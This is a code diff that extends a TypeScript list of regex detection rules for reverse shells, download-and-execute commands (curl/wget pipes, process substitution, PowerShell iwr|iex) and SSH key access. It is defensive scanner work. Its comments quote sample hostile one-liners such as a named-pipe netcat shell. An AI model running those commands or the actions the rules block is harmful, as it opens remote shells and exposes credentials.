@@ -18,18 +18,31 @@ export interface PatternRule {
 // Ported from openclaw-security-monitor, Sclawhub rules, and B@dskills payloads
 export const SECURITY_PATTERNS: PatternRule[] = [
   // Reverse shells (from B@dskills + openclaw-security-monitor)
-  { id: 'RS-001', pattern: /\b(?:bash|sh|zsh)\s+-i\s+>&?\s*\/dev\/tcp\//i, category: 'reverse-shell', severity: 'critical', description: 'Bash reverse shell pattern' },
-  { id: 'RS-002', pattern: /\bnc\b.*-e\s+(?:\/bin\/(?:ba)?sh|cmd)/i, category: 'reverse-shell', severity: 'critical', description: 'Netcat reverse shell' },
+  // `>&`, `&>` and `>` all send the interactive shell's output to the socket
+  { id: 'RS-001', pattern: /\b(?:bash|sh|zsh|ksh)\s+-i\s+(?:>&|&>|>)\s*\/dev\/(?:tcp|udp)\//i, category: 'reverse-shell', severity: 'critical', description: 'Bash reverse shell pattern' },
+  { id: 'RS-002', pattern: /\b(?:nc|ncat|netcat)\b.*(?:-e|-c|--exec|--sh-exec)\s+\S*(?:\/(?:ba|z)?sh\b|cmd)/i, category: 'reverse-shell', severity: 'critical', description: 'Netcat reverse shell' },
   { id: 'RS-003', pattern: /\bnet\.connect\s*\(.*\bchild_process\b/i, category: 'reverse-shell', severity: 'critical', description: 'Node.js net.connect reverse shell' },
   { id: 'RS-004', pattern: /\bnew\s+WebSocket\b.*\bchild_process\b/is, category: 'reverse-shell', severity: 'critical', description: 'WebSocket reverse shell' },
   { id: 'RS-005', pattern: /\bsocket\b.*(?:\bsubprocess\.|\b(?:exec|execSync|spawn|spawnSync|popen)\s*\(|\bos\.dup2\s*\()/i, category: 'reverse-shell', severity: 'critical', description: 'Socket-based reverse shell' },
   { id: 'RS-006', pattern: /python\S*\s+-c\s+['"]import\s+socket/i, category: 'reverse-shell', severity: 'critical', description: 'Python reverse shell' },
   { id: 'RS-007', pattern: /\bsocat\b.*\bexec:/i, category: 'reverse-shell', severity: 'critical', description: 'Socat reverse shell' },
+  // `mkfifo f; cat f | sh -i 2>&1 | nc host port > f` — netcat without -e
+  { id: 'RS-008', pattern: /\bmkfifo\b.*\|\s*(?:\S*\/)?(?:ba|z|k)?sh\b.*\|\s*(?:nc|ncat|netcat)\b/i, category: 'reverse-shell', severity: 'critical', description: 'Named-pipe netcat reverse shell' },
+  // `exec 5<>/dev/tcp/host/port` — a read-write socket on a shell descriptor
+  { id: 'RS-009', pattern: /\bexec\s+\d+<>\s*\/dev\/(?:tcp|udp)\//i, category: 'reverse-shell', severity: 'critical', description: 'Bash /dev/tcp socket descriptor' },
 
   // Curl-pipe execution
-  { id: 'CP-001', pattern: /curl\s+[^|]*\|\s*(?:ba)?sh/i, category: 'curl-pipe', severity: 'critical', description: 'Curl-pipe-shell execution' },
-  { id: 'CP-002', pattern: /wget\s+[^|]*\|\s*(?:ba)?sh/i, category: 'curl-pipe', severity: 'critical', description: 'Wget-pipe-shell execution' },
+  // The shell may be run through sudo/env and named by path (`| sudo bash`,
+  // `| /bin/zsh`); `\b` keeps `| shasum` out.
+  { id: 'CP-001', pattern: /curl\s+[^|]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+(?:\S+=\S*\s+)*)?(?:\S*\/)?(?:ba|z|k|da|fi)?sh\b/i, category: 'curl-pipe', severity: 'critical', description: 'Curl-pipe-shell execution' },
+  { id: 'CP-002', pattern: /wget\s+[^|]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+(?:\S+=\S*\s+)*)?(?:\S*\/)?(?:ba|z|k|da|fi)?sh\b/i, category: 'curl-pipe', severity: 'critical', description: 'Wget-pipe-shell execution' },
   { id: 'CP-003', pattern: /curl\s+[^|]*\|\s*python/i, category: 'curl-pipe', severity: 'critical', description: 'Curl-pipe-python execution' },
+  // Download executed without a pipe: `bash <(curl …)`, `sh -c "$(curl …)"`,
+  // `eval "$(wget -qO- …)"`, `source <(curl …)`
+  { id: 'CP-004', pattern: /(?:\b(?:ba|z|k|da)?sh|\bsource|(?:^|[\s;&|])\.)\s+<\(\s*(?:curl|wget)\b/i, category: 'curl-pipe', severity: 'critical', description: 'Shell process substitution of a download' },
+  { id: 'CP-005', pattern: /(?:\b(?:ba|z|k|da)?sh\s+-c|\beval)\s+["']?\$\(\s*(?:curl|wget)\b/i, category: 'curl-pipe', severity: 'critical', description: 'Shell command substitution of a download' },
+  // PowerShell: `iwr … | iex`, `iex (irm …)`
+  { id: 'CP-006', pattern: /\b(?:iwr|irm|invoke-webrequest|invoke-restmethod)\b[^|]*\|\s*(?:iex|invoke-expression)\b|\b(?:iex|invoke-expression)\s*\(?\s*(?:\(\s*)?(?:iwr|irm|invoke-webrequest|invoke-restmethod|new-object\s+net\.webclient)\b/i, category: 'curl-pipe', severity: 'critical', description: 'PowerShell download-and-execute' },
 
   // Credential harvesting (from B@dskills)
   { id: 'CH-001', pattern: /\/\.ssh\/(?:id_rsa|id_ed25519|authorized_keys|config)/i, category: 'credential-harvest', severity: 'critical', description: 'SSH key access' },
